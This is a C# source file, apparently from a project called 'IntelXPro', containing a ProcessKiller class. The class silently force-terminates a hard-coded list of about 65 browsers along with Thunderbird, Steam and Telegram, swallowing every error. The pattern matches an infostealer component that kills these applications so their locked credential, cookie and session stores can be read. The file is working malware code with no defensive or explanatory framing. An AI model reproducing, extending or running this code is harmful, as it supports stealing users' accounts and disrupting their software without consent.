using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Dependencies.General
{
    public static class ProcessKiller
    {
        public static string[] Targets = new string[65]
    {
        "thunderbird.exe", "icedragon.exe", "cyberfox.exe", "blackhawk.exe", "palemoon.exe", "ghostery.exe", "undetectable.exe", "sielo.exe", "conkeror.exe", "msedge.exe",
        "netscape.exe", "seamonkey.exe", "slimbrowser.exe", "msedge_pwa_launcher.exe", "avant.exe", "opera.exe", "operagx.exe", "msedgewebview2.exe", "msedgewebview.exe", "chromium.exe",
        "slimjet.exe", "chrome.exe", "browser.exe", "vivaldi.exe", "brave.exe", "edge.exe", "microsoft.exe", "dragon.exe", "torch.exe", "mozila.exe",
        "yandex.exe", "sputnik.exe", "nichrome.exe", "msedge_proxy.exe", "cocbrowser.exe", "uran.exe", "msedge_proxy.exe", "chromodo.exe", "atom.exe", "bravebrowser.exe",
        "steam.exe", "cryptotab.exe", "ghostbrowser.exe", "maelstrom.exe", "kinza.exe", "globus.exe", "falkon.exe", "elementbrowser.exe", "colibri.exe", "whale.exe",
        "avastbrowser.exe", "ucbrowser.exe", "maxthon.exe", "blisk.exe", "aolshield.exe", "baidubrowser.exe", "ccleanerbrowser.exe", "hola.exe", "xvast.exe", "kingpin.exe",
        "qqbrowser.exe", "private_browsing.exe", "chrome_pwa_launcher.exe", "chrome_proxy.exe", "telegram.exe"
    };

        private const uint PROCESS_QUERY_LIMITED_INFORMATION = 4096u;

        private const uint PROCESS_TERMINATE = 1u;

        public static void KillerAll()
        {
            string[] targets = Targets;
            if (targets == null || targets.Length == 0)
            {
                return;
            }
            HashSet<string> wanted = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
            string[] array = targets;
            foreach (string text in array)
            {
                if (string.IsNullOrWhiteSpace(text))
                {
                    continue;
                }
                string text2 = text.Trim().Replace("\"", string.Empty);
                try
                {
                    text2 = Path.GetFileName(text2);
                }
                catch
                {
                }
                if (!string.IsNullOrEmpty(text2))
                {
                    wanted.Add(text2);
                    if (!text2.EndsWith(".exe", StringComparison.OrdinalIgnoreCase))
                    {
                        wanted.Add(text2 + ".exe");
                    }
                    string fileNameWithoutExtension = Path.GetFileNameWithoutExtension(text2);
                    if (!string.IsNullOrEmpty(fileNameWithoutExtension))
                    {
                        wanted.Add(fileNameWithoutExtension);
                    }
                }
            }
            if (wanted.Count == 0)
            {
                return;
            }
            List<ProcessWindows.ProcInfo> procInfos = ProcessWindows.GetProcInfos();
            if (procInfos == null || procInfos.Count == 0)
            {
                return;
            }
            Parallel.ForEach(procInfos, delegate (ProcessWindows.ProcInfo proc)
            {
                if (proc == null)
                {
                    return;
                }
                try
                {
                    string text3 = null;
                    if (!string.IsNullOrEmpty(proc.Path))
                    {
                        try
                        {
                            text3 = Path.GetFileName(proc.Path);
                        }
                        catch
                        {
                            text3 = proc.Path;
                        }
                    }
                    if (string.IsNullOrEmpty(text3))
                    {
                        text3 = proc.Name ?? string.Empty;
                    }
                    string item;
                    try
                    {
                        item = Path.GetFileNameWithoutExtension(text3);
                    }
                    catch
                    {
                        item = text3;
                    }
                    if ((!wanted.Contains(text3) && !wanted.Contains(item)) || !int.TryParse(proc.Pid, out var result) || result == 0 || result == 4)
                    {
                        return;
                    }
                    IntPtr intPtr = IntPtr.Zero;
                    try
                    {
                        intPtr = NativeMethods.OpenProcess(4097u, bInheritHandle: false, (uint)result);
                        if (intPtr == IntPtr.Zero)
                        {
                            intPtr = NativeMethods.OpenProcess(4096u, bInheritHandle: false, (uint)result);
                            if (!(intPtr != IntPtr.Zero))
                            {
                                return;
                            }
                            NativeMethods.CloseHandle(intPtr);
                            intPtr = NativeMethods.OpenProcess(1u, bInheritHandle: false, (uint)result);
                            if (intPtr == IntPtr.Zero)
                            {
                                return;
                            }
                        }
                        try
                        {
                            NativeMethods.TerminateProcess(intPtr, 1u);
                        }
                        catch
                        {
                        }
                    }
                    finally
                    {
                        try
                        {
                            if (intPtr != IntPtr.Zero)
                            {
                                NativeMethods.CloseHandle(intPtr);
                            }
                        }
                        catch
                        {
                        }
                    }
                }
                catch
                {
                }
            });
        }
    }
}
